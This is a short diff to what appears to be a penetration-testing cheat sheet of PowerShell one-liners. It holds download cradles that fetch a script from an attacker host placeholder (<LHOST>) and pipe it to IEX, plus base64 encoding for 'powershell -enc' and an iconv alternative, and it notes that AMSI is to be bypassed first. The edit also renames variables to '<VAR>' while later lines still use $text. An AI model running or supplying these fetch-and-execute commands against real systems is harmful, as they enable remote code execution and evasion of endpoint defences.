@@ -1,9 +1,10 @@
 % powershell/misc
 
 # base64 encode command string
-$text = "(New-Object System.Net.WebClient).DownloadString('http://<LHOST>:8000/run.txt') | IEX"
-$b64 = [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($text))
+<VAR>text = "(New-Object System.Net.WebClient).DownloadString('http://<LHOST>:8000/run.txt') | IEX"
+<VAR>b64 = [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($text))
 powershell -enc $b64
+alternative: iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
 
 # fileless import/execute (bypass amsi first)
 IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/<PS1>")
